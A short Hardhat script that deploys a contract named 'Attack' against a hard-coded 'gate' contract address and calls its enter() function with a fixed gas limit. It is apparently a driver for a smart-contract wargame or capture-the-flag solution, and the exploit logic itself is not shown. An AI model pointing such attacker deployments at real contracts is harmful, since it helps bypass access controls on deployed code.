import { ethers, network } from "hardhat";
import * as helper from "./helpful_scripts";


async function main() {
    const [account] = await ethers.getSigners();
    const gateAddress = "0xF54d3Bb375da68764Aa972840c8C08af665fb3fC";

    const attacker = await helper.deployContract("Attack", gateAddress);

    let tx = await attacker.enter({
        gasLimit: 1000000
    });
    await tx.wait();
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });